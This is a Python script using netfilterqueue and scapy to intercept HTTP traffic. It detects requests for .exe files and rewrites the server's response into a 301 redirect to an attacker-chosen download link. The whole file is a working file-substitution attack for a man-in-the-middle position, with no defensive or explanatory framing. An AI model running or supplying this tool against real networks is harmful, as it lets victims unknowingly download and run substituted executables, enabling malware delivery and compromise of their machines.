import netfilterqueue
import optparse
import scapy.all as scapy

ack_list = []
new_download = ""

def get_arguments():
    global new_download

    parser = optparse.OptionParser()
    parser.add_option("-r", "--redirect-to", dest = "redirect", help = "New download link.")
    (options, arguments) = parser.parse_args()

    if not options.redirect:
        parser.error("[-] Please specify a link, use --help for more info.")

    new_download = options.redirect

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    global new_download
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("\033[94m[+]\033[0m .exe requested!")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("\033[92m[+]\033[0m Replacing file")
                new_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + new_download + "\n\n")

                packet.set_payload(str(new_packet))

    packet.accept()

get_arguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
